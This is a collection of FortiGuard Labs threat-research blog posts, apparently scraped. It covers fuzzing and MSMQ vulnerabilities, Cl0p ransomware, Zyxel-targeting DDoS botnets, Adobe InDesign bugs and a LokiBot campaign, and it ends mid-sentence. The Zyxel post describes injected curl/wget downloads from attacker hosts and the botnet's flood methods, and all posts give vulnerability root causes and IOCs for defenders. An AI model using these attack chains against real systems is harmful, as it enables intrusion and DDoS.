structure. However, it is trivial to achieve if you have a Windows kernel debugger attached to the target OS. After that, the custom DLL can install a hook on the service host process to monitor process creation and process termination operations. For our use case, the custom DLL uses the Windows debugger API to capture exceptions/crashes for our target service process, MQSVC.EXE. The code snippet for the main debugger thread is shown in Figure 3. At the same time, we also wanted to attach a debugger to the service process before it starts to execute. This is very helpful in reverse engineering if you want complete control over the target process before it starts to execute any code. On top of that, we can also use the Windows Time-Travel-Debugger (TTD), tttracer.exe, to capture the complete trace of the target service process, which is helpful for crash triaging. Figure 4 shows the code snippet of the hook function in the custom DLL that will delay the execution of the target process when it is spawned by services.exe. Network protocol fuzzing is more effective if we send well-crafted packets to the target. Fortunately, MSMQ specifications are publicly available, and most importantly, most of its message headers data structure is documented by Microsoft. This allows us to write a structure-aware fuzzer that will mutate data according to its format and data type rather than generating random meaningless input data. Another critical component needed by our MSMQ fuzzer is a coverage-guided capability. TinyInst by Ivan Fratric is my first go-to binary instrumentation library for remote process fuzzing. Furthermore, the library is well-designed, making it easy to integrate into any custom fuzzer. Figure 5 shows the code snippet of the MSMQ fuzzer that attempts to generate a structured EodMessage header packet. A typical MSMQ packet must include headers, such as BaseHeader, UserHeader, and MessagePropertiesHeader. It may also include additional optional headers, like TransactionHeader, SecurityHeader, DebugHeader, SessionHeader, etc. As shown in Figure 6, the optional headers come after the mandated headers and are ordered sequentially. Our MSMQ fuzzer considers the order of the message headers to pass the sanity check of the message header parser. One of the RCE vulnerabilities is, in fact, caused by an unsanitized field in a particular message header data structure when the crafted packet is parsed by the message header parser. Because of how the message header parses the packets—looking for the headers sequentially—it will eventually trigger an out-of-bounds memory write. FortiGuard Labs provides vulnerability identification signatures toFortiDASTusers that can detect these vulnerabilities via an exploit engine module called the FortiDAST Scripting Engine (FSE). Some of the basic features of this exploit engine were introduced in a FortiGuardblogback in 2021. FortiDAST performs automated black-box dynamic application security testing of web applications to identify vulnerabilities that threat actors may exploit. FSE is an add-on to FortiDAST that enables the detection of CVE-specific vulnerabilities on networked assets not limited to web applications. When users configure the Exploit Engine (Figure 8), they will be asked to select the type of applications currently supported by FSE. In this case, we will demonstrate the ability of FortiDAST to detect assets that run the vulnerable Message Queuing service. Upon completing the scan, FortiDAST will show the result of FSE under the Exploit Engine dashboard, as shown in Figure 10: This next section reviews the vulnerabilities we discovered using the process described above along with related IPS signatures. This out-of-bounds read occurs because EodHeader, StreamIdSize, and OrderQueueSize are not validated before accessing them in the message header parser routine CQmPacket::CQmPacket. The message header parser routine has scrutinized most of the message header, but it turns out that the data structure for the header in question is not being validated. Based on our analysis, an information disclosure exploit seems implausible. However, a denial-of-service attack can be achieved when the out-of-bound read accesses an invalid address. FortiGuard Labs has released the IPS signatureMS.Windows.Message.Queuing.Service.CVE-2023-28302.DoSto detect this issue. This out-of-bounds write occurs because the message header parser, CQmPacket::CQmPacket, does not properly validate a message header with an arbitrary size. Some message headers, such as EodHeader, EodAckHeader, and CompoundMessageHeader, allow attackers to specify an arbitrary size/length that is not properly sanitized. As mentioned previously, the message headers are organized in sequential order. The message header parser will adjust the pointer according to the defined data structures for each specific message header. Since some message headers are not being validated, the pointer can be adjusted to point to an arbitrary location, an invalid address in this context, and potentially cause memory corruption when the pointer to the message header is dereferenced in the later part of the code. FortiGuard Labs has released the IPS signatureMS.Windows.MSMQ.CVE-2023-21554.Remote.Code.Executionto detect this issue. This vulnerability is a result of a manual code audit. After analyzing the previous vulnerabilities, we looked into the message headers that have not performed a sanity check on their data structure. As a result, the CompoundMessage header caught our attention. Figure 11 defines the CompoundMessage header data structure. Based on our analysis, the message header was referenced in CQmPacket::GetPacketBody. This function will retrieve data from the MsgBodySize field. An out-of-bounds write will occur when the data is dereferenced without any sanity check in functions such as CQmPacket::Decrypt, VerifySignature10, and VerifySignature20, just to name a few. Apart from the CompoundMessage header, the SecurityHeader is also required in the crafted network packet to trigger this vulnerability. Notably, all the data fields in the SecurityHeader data structure are properly validated. A malformed data structure in the CompoundMessage header could affect the MSMQ kernel mode component, MQAC.SYS. Our fuzzer uncovered the faulty code path to trigger the out-of-bounds write in MQAC.SYS with a properly defined SrmpEnvelopeHeader that holds SOAP XML contents to the target queue. Figure 12 shows the crash call stack in MQAC.SYS when it leverages the unsanitized length in the CompoundMessage header. FortiGuard Labs has released the IPS signatureMS.Windows.MSMQ.CompoundMessage.Remote.Code.Executionto detect this issue. Fortinet customers can use FortiDAST to identify any network assets that may be vulnerable to the MSMQ vulnerabilities discussed previously. FortiGuard Labs has also released IPS signatures to protect our customers from the vulnerabilities mentioned in this post. Again, we can’t emphasize enough the urgency to apply the latest Microsoft patches to prevent you or your organization from falling victim to a devastating cyberattack. FortiDASTcustomers are able to detect the existence of these vulnerabilities in their assets.Fortinet IPS customers are protected with the following signatures, which were previously released for these vulnerabilities: If you believe these or any other cybersecurity threats have impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. microsoft FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/microsoft-message-queuing-service-vulnerabilities"
  },
  {
    "title": "Ransomware Roundup - Cl0p",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Cl0p ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows, Linux UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High Recently, the Cl0p ransomware group received a lot of media attention for compromising a large number of organizations by exploiting a recently-unpatched vulnerability in MOVEit Transfer (CVE-2023-34362), a managed file transfer (MFT) solution. Although there is no evidence that the threat actor used the encryptor in this particular incident, the group exfiltrated data from victims and threatened them with ransom in exchange for not exposing the stolen information. This blog provides insights into the Cl0p ransomware group’s activities over the past several years. Note that FortiGuard Labs released an Outbreak Alert for the MOVEit Transfer incident. Please refer to “Progress MOVEit Transfer SQL Injection Vulnerability” for additional information. The history of Cl0p ransomware goes back to early 2019 and is typically associated with financially motivated threat actor FIN11 (also known as TA505 and Snakefly), who is known to target organizations in North America and Europe. The Cl0p ransomware appears to be a descendent (or variant) of another ransomware, “CryptoMix”, which also has an association with FIN11. And CryptoMix is reportedly a hybrid of the ransomware variants “CryptXXX” and “CryptoWall”. However, that claim has not yet been independently verified by FortiGuard Labs. Typically, FIN11 unleashes Cl0p ransomware on a victim’s network to encrypt files after stealing information. However, the ransom note dropped by an older Cl0p ransomware variant, shown below, shows no evidence of FIN11 having exploited victim data, at least during the early period of Cl0p ransomware activity. It is estimated that they only began exfiltrating victim information around the time the leak site described later in this report was set up. At some stage in its operations, the FIN11 group revised its strategy of deploying ransomware and shifted to purely exfiltrating information from victims for extortion. In fact, there is no evidence that the Cl0p ransomware was deployed when the MOVEit Transfer vulnerability was recently exploited. Deployed Cl0p ransomware variants append a new file extension to the files it encrypts. Typical file extensions include, but are not limited to, “.Clop”, “.Cl0p”, “.C_L_O_P”, “.C_I_0P” and “.Cllp”. Cl0p ransomware ransom notes are labeled “ClopReadMe.txt”, “README_README.txt” and “!!!_READ_!!!.RTF”. The Cl0p threat actor is also associated with the use of the Cobalt Strike post-exploitation tool, web shells such as DEWMODE and LEMURLOOT,  SDBot, and the FlawedAmmyy remote access trojan (RAT). FIN11 is also known to use spear-phishing to target victims. FIN11 recently leveraged the MOVEit Transfer SQL injection vulnerability (CVE-2023-34362) to gain initial entry to victim networks. This was not the first time the group has exploited vulnerabilities. According toa reportpublished by the Health Sector Cybersecurity Coordination Center (HC3), the following vulnerabilities have been potentially exploited by this group: While earlier Cl0p ransomware variants only include an attacker’s contact email addresses, the ransom group subsequently set up a data leak site on TOR in 2020 called “CL0P^_-LEAKS” to post information stolen from victims. On the TOR site, the ransomware group also states that its primary motivation is financial gain and that it is not politically motivated in its choice of victims. The group also claims that it intends to attack commercial pharmaceutical companies, but not hospitals and social institutions. As of July 15th, 2023, Fortinet's FortiRecon service listed 419 victim organizations on the Cl0p ransomware data leak site. According to data collected through Fortinet's FortiRecon service, the Cl0p ransomware group preyed on several industry sectors between January and June 2023, with business services leading the way, followed by software and finance. When victim organizations are classified by country, the United States is in first place by a significant margin. By region, nearly three-quarters of victims are located in North America and Europe. The FortiRecon data below indicates that the Cl0p ransomware has been more active in 2023 than 2022 and 2021. The inactivity of the ransomware group from May to July 2021 could be attributed tothe arrest of some Cl0p ransomware operatorsin June 2021, though we cannot verify this. Looking closely at the prevalence of Cl0p ransomware in the United States during the first half of 2023, Cl0p ranked third behind LockBit and Blackcat (ALPHV) ransomware. The Cl0p ransomware has been around since early 2019, and its developers are still one of the most active ransomware threat actors today. While they seem to have largely shifted from \"exfiltrating and encrypting data and extorting money\" to simply \"exfiltrating data and extorting money,\" affected organizations are just as impacted as before. As the group is known to exploit high-severity vulnerabilities, including the recently disclosed MOVEit Transfer vulnerability, patch management is critical to preventing attacks by the group. Note that a large number of Cl0p ransomware samples exist due to the high prevalence of the ransomware over the past several years. Because of this, this section only contains a small number of samples from the ransomware family. SHA2 Note 3320f11728458d01eef62e10e48897ec1c2277c1fe1aa2d471a16b4dccfc1207 Cl0p ransomware d0cde86d47219e9c56b717f55dcdb01b0566344c13aa671613598cab427345b9 Cl0p ransomware d36766cbc149d7f79654d2810ffe2fd3b1a6487fe3aff6ff010e664b60493cf0 Cl0p ransomware 1687eda911c5129f3189d7e1ad31430856d7732fe870eb49971298367b98189c Cl0p ransomware f1b8c7b2d20040f1dd9728de9808925fdcf035a1a289d42f63e5faa967f50664 Cl0p ransomware 343cb2d5900f5fe4abd5442a4a18541753fbb6ca5ff4ee7f2c312ed96e413335 Cl0p ransomware 968307a367471e25bef58b0d4687ab4fdf34539bbfb603b5b19ae99d4d0c0340 Cl0p ransomware 09d6dab9b70a74f61c41eaa485b37de9a40c86b6d2eae7413db11b4e6a8256ef Cl0p ransomware for Linux FortiGuard Labs has the following AV signatures in place for the Cl0p ransomware samples listed in the IOC section: Additionally, the following AV signatures are available for Cl0p ransomware samples: FortiGuard Labs has put the following IPS signatures in place for the vulnerabilities reportedly exploited by the Cl0p ransomware threat actor: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Fortinet’s FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations also need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Organizations are encouraged to implement cloud-based security solutions, such asSASE, to protect off-network devices, advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack, andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context. These solutions are proven to minimize risk and reduce the impact of a successful ransomware attack. By operating these solutions as part of the industry's only fully integratedSecurity Fabric, organizations can also take advantage of native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings that can be deployed independently or as part of the Fortinet Security Fabric. These services are powered by advanced AI-enabled technologies and our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-cl0p"
  },
  {
    "title": "DDoS Botnets Target Zyxel Vulnerability CVE-2023-28771",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical In June 2023, FortiGuard Labs detected the propagation of several DDoS botnets exploiting the Zyxel vulnerability (CVE-2023-28771). This vulnerability is characterized by a command injection flaw affecting multiple firewall models that could potentially allow an unauthorized attacker to execute arbitrary code by sending a specifically crafted packet to the targeted device. The severity of this flaw, rated 9.8 on theCVSSscoring system, was reported by researchers fromTRAPA Security. Zyxel released asecurity advisoryregarding this vulnerability on April 25, 2023. Subsequently, the Cybersecurity and Infrastructure Security Agency (CISA) added this security flaw to itsKnown Exploited Vulnerabilities(KEV) catalog in May. Through the capture of exploit traffic, the attacker's IP address was identified, and it was determined that the attacks were occurring in multiple regions, including Central America, North America, East Asia, and South Asia. Since the publication of theexploit module,there has been a sustained surge in malicious activity. Analysis conducted by FortiGuard Labs has identified a significant increase in attack bursts starting from May, as depicted in the trigger count graph shown in Figure 1. We also identified multiple botnets, including Dark.IoT, a variant based on Mirai, as well as another botnet that employs customized DDoS attack methods. In this article, we will provide a detailed explanation of the payload delivered through CVE-2023-28771 and associated botnets. Based on our observations over the past month, we have noted that these attacks originate from distinct IP addresses: 193[.]32[.]162[.]190, 109[.]205[.]213[.]30, 109[.]207[.]200[.]42, 109[.]207[.]200[.]47 and 109[.]207[.]200[.]44. These attacks specifically target the command injection vulnerability in the Internet Key Exchange (IKE) packet transmitted over UDP on Zyxel devices. The attackers utilize tools such as curl or wget to download scripts for further actions. Below, you can find the corresponding traffic capture illustrating these activities. The script files obtained in these attacks exclusively download files tailored for the MIPS architecture, indicating a highly specific target. In Figure 3, the script downloads a file named \"lolmips\" from the IP address 92[.]118[.]39[.]16 and saves it as \".zw\". Subsequently, it executes with the \"zywall\" parameter indicating its connection to the Zyxel firewall vulnerability. The script file shown in Figure 4 was downloaded from 171[.]22[.]136[.]15, which has been associated with theRapperbotmalware. However, we observed this script being forwarded to 171[.]22[.]136[.]18, where it dropped additional MIPS files for subsequent actions. The script files in Figure 5 exhibit similar code patterns despite originating from different server IP addresses. These scripts employ the \"rm -rf\" command to remove the \".zw\" file from the temporary folder and save the current file as \"/tmp/a\". Notably, the execution files display resemblances. It appears that this campaign utilized multiple servers to launch attacks and updated itself within a few days to maximize the compromise of Zyxel devices. In the following sections, we introduce the botnets we have identified as spreading via CVE-2023-28771 over the past month. Based on the C2 server list, which includes numerous domains with the \".lib\" extension, including some used in previous versions, we identified this variant as Dark.IoT. Dark.IoT first emerged in 2021 and has established itself as a prolific botnet that extends its targeting beyond IoT devices. It updated its C2 server in April with \"raw.pastebin.com,\" and we encountered a newer version in June. One prominent feature of Dark.IoT is the presence of the data string \"pte8cjbdwrmn57g4i6qual20s1k3vfoh,\" which generates random alphanumeric strings during the setup process. The corresponding function can be seen in Figure 6. Dark.IoT employs the ChaCha20 algorithm to encrypt its configuration. During the decryption process, it first performs an XOR operation on the 32-byte decryption key with the value 0x55. Subsequently, it utilizes this modified key along with a nonce to invoke the ChaCha20 decryption function. The code responsible for this decryption process is displayed in Figure 7. Upon successful decryption, the identified C2 servers are as follows. (Notably, the last two servers, namely \"routercontroller[.]geek\" and \"dvrcontroller[.]libre,\" have been newly added in this version. Dark.IoT utilizes the OpenNIC server with the IP address \"147.182.243.49\" for DNS resolution and establishes communication with the C2 servers.) Figure 8 illustrates the victim's keep-alive message, identified as \"GET / HTTP/1.1\\r\\n\\r\\n\". Once the victim system receives the attack command, it starts a DDoS attack on a specific IP address and port number. One example of this DDoS attack traffic is shown below. This particular botnet, derived from a Mirai variant, features encoded configurations and a collection of XOR keys. It employs an index-based method to decode the data retrieved from the \".rodata\" section. As an illustration, when the index is set to 0, the corresponding key value is 0xCE (calculated as 0x2E ^ 0x0E ^ 0x16 ^ 0xF8), as depicted in Figure 10. After execution, the program prints \"listening tun0\" in the console. It then utilizes the XOR decoding function shown in Figure 11 to obtain the C2 servers. The victim system subsequently sends a hard-coded hex value of 0x17b99063 and appends the victim's public IP address. The captured C2 traffic is displayed in Figures 12 and 13. As mentioned in the initial section, this campaign has demonstrated a pattern of frequent updates within a short timeframe. Our initial discovery of this botnet took place on May 25, 2023. But our analysis identified a similar environment-checking process across different samples. The sample obtained on May 25 did not contain a clear string indicating its C2 domain. However, after June, we observed a change in the domain structure, with the C2 domains now prefixed with \"new.” For the remainder of this section, we will concentrate on the sample collected on June 26 and provide the derived findings. Initially, the botnet verifies whether a specific parameter is present. If the parameter is absent, it assigns the value \"unknown\" and continues with the execution. Next, the botnet retrieves self-information from the \"/proc/self/maps\" file to perform additional checks on the execution path. It ensures that the execution path is not \"/lib\", \"/sbin/\", or \"/usr/\". If the checking fails, the execution is immediately aborted, and the botnet terminates itself. Afterward, the botnet proceeds by generating a random integer using \"time()\" and \"pid()\" for the forked process. The code responsible for this process is presented in Figure 17. Before connecting with the C2 server, the malware initializes all DDoS attack functions. This botnet encompasses a total of 11 methods, namely udpflood, synflood, greflood, ackflood, tcpflood, tcp2flood, udp2flood, socketflood, udpconnflood, wraflood, and vseflood. The initial packet transmitted to the server contains parameters derived from the script file obtained via CVE-2023-28771. This packet is prefixed with \"TCP Connect,\" shown in Figure 19, which provides a detailed representation of this communication. The C2 server issues commands that the botnet handles using a switch case structure, incorporating the following capabilities: By examining the attack method names, we were able to trace back to another sample associated with the C2 domain \"djk38zbdhqpdlshfb[.]shinji[.]app.\" Additionally, we discovered a Telegram group called \"SHINJI.APP | Katana botnet\" that is actively involved in updating the botnet's methods and performing maintenance tasks. The botnet's owner has recently updated its methods, as demonstrated in Figure 20, where the method names align with those found in the MIPS execution file. Targeting vulnerable devices has always been a primary objective for threat actors, and the prevalence of remote code execution attacks poses a major concern for IoT devices and Linux servers. The presence of exposed vulnerabilities in devices can lead to significant risks. Once an attacker gains control over a vulnerable device, they can incorporate it into their botnet, enabling them to execute additional attacks, such as DDoS. To effectively address this threat, it is crucial to prioritize the application of patches and updates whenever possible. Taking proactive measures to ensure the security of these devices is highly recommended. The malware described in this report are detected and blocked by FortiGuard Antivirus as: BAT/Agent.BI!tr.dldrBAT/Agent.CEG!trELF/Mirai.BPD!trELF/Mirai.BQX!trELF/Mirai.AX!trELF/Mirai.CBG!trELF/Mirai.CEG!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. FortiGuard Labs provides the following IPS signature against attacks exploiting the vulnerability discussed in this report: CVE-2023-28771:Zyxel.Firmware.error.message.Command.Injection For a comprehensive list of protections from FortiGuard Labs for this vulnerability, please visit theOutbreak Alertpage for further details. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. d618c817e6a93193a499126156a1f7e888008dacdb247a769fd69ce4c0c87b67a6729c047d776294fa21956157eec0b50efa7447b8e2834b05be31080767006f729f2fa4d037912a360cb7c4e2c37765da0c38725451600f0258109b672f615e2c55674e938e7618f7c9273e3da61ce7aeab3dc5626b7b8b4e3fc7cc95d0436f928d8ccd71edda5891068d703603ba0b70687f746c9da73afa6692b274ea757c6137a30d8eb932d25664ced747424b15072e676b5d4d27d5b8f3b84f483442170c394849ce4f636cc79cc84389b66a0dbdaf14a61a6d87302e807f2153bc6c2b2fe13ee992cf00778bcc92dc3732305114dca1700dedca7c29342216df236644034cdcb42d1d7b921b4732230bbdcb4089107490a30b8cd7a62e67b657e33d263d69c780fefa0c3a34190989d43268a272004f0623d3e596bc0c92e1744832c979f69993110688372a5898d05f1141b7f44f3f5f55cd50b6a493c1d33af141c8c68211116bbc43c2fe0aba8b598b88b218adc0d995311a4e7030de8acd48076e51becb81d6bdfe79111974c05f2e4a20a8825a872a92df86cbc98517100b031a42b4e116c5d2d3e9d4777c7eaa3c3835a126c02673583c2dfb1ae2bf0bf0db4885d3d93910bfb8410a0e82810d05aa67a6702ce0cdfc38d1d01f2f9471d2015012c65cfd227d393fd338223eb50140571760de04ef0a21fe3c4636e1bfaf4966f82f5ec551f9ac3bb5a3b1ace5dd21c35239bd983fd9a36e0e7c07bfb48a3fdd28fa9225db6d42084123989712313489e255376134f8e77f07b77c345a026304312022da42ab6df882c44d984f9aceea7f08e217a5ca8ca985c533a1af399cee botnets,cve,DDoS attacks FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ddos-botnets-target-zyxel-vulnerability-cve-2023-28771"
  },
  {
    "title": "FortiGuard Labs Discovers Multiple Vulnerabilities in Adobe InDesign",
    "content": "FortiGuard Labs Threat Research This past March, I discovered and reported several zero-day vulnerabilities in Adobe InDesign to Adobe. And on Patch Tuesday, July 11, 2023, Adobe released theirsecurity patchesto fix them.The vulnerabilities are identified as CVE-2023-29308, CVE-2023-29309, CVE-2023-29310, CVE-2023-29311, CVE-2023-29312, CVE-2023-29313, CVE-2023-29314, CVE-2023-29315, CVE-2023-29316, CVE-2023-29317, CVE-2023-29318, and CVE-2023-29319. All of these vulnerabilities have been assigned a Critical or Important severity. They also each have different root causes related to a single InDesign plugin. Due to the severity of these vulnerabilities, we suggest that users apply the Adobe patch as soon as possible. Affected platforms:Windows and macOSImpacted parties:Users of Adobe InDesign 2023 version 18.3 and earlier. Users of Adobe InDesign 2022 version 17.4.1 and earlier.Impact:Multiple vulnerabilities leading to memory leaks or arbitrary code execution.Severity level:Critical and Important Following are some details on these vulnerabilities. More information can be found on the related FortinetZero DayAdvisory pages by clicking on the CVE links below: This Arbitrary Code Execution vulnerability exists in decoding QuarkXPressDrawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory write due to an improper bounds check. Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29308.Arbitrary.Code.Execution for this specific vulnerability to proactively protect our customers. This out-of-bounds read vulnerability exists in decoding QuarkXPress Drawing‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29309.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29310.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29311.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29312.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29313.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29314.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29315.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29316.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29317.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29318.Memory.Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe.InDesign.CVE-2023-29319.Memory.Leak for this specific vulnerability to proactively protect our customers. Fortinet IPS customers are protected with the following signatures, which were previously released for these vulnerabilities: In addition, FortiEDR detects and prevents the exploitation of these vulnerabilities. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard Security Subscriptions and Servicesportfolio. zero-day vulnerability,adobe,zero-day FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/adobe-indesign-zero-day-vulnerabilities"
  },
  {
    "title": "LokiBot Campaign Targets Microsoft Office Document Using Vulnerabilities and Macros",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Control and collect sensitive information from a victim’s deviceSeverity level:Critical In a recent FortiGuard Labs investigation, we came across several malicious Microsoft Office documents designed to exploit known vulnerabilities. Specifically, CVE-2021-40444 and CVE-2022-30190 are remote code execution vulnerabilities. Exploiting these vulnerabilities allowed the attackers to embed malicious macros within Microsoft documents that, when executed, dropped the LokiBot malware onto the victim's system. LokiBot, also known as Loki PWS, has been a well-known information-stealing Trojan active since 2015. It primarily targets Windows systems and aims to gather sensitive information from infected machines. In this article, we will delve into the specifics of the identified documents, explore the payload they delivered, and outline the behavioral patterns exhibited by LokiBot. Our analysis aims to shed light on the intricacies of this threat and increase awareness regarding its operational methods. During May 2023, we obtained two types of Word documents for analysis. The first type featured an external link embedded within an XML file, “word/_rels/document.xml.rels,” while the second type included a VBA script that executed a macro immediately upon opening the document. Notably, both files contained a strikingly similar bait image, depicted in Figure 1. The Word document that targets CVE-2021-40444 contained a file “document.xml.rels”, shown in Figure 2, with an external link using MHTML (MIME encapsulation of aggregate HTML documents). This web archive file format combines a website's HTML code and companion resources into a single file. This link also uses Cuttly, a URL shortener and link management platform, to redirect users to the cloud file-sharing website, “GoFile.” Further analysis revealed that a file named “defrt.html” was downloaded upon accessing the link. This file exploits the second vulnerability, CVE-2022-30190. The content of this file and the decoded data is displayed in Figure 3. Upon executing the payload, it initiates the download of an injector file named “oehrjd.exe” from the following URL: 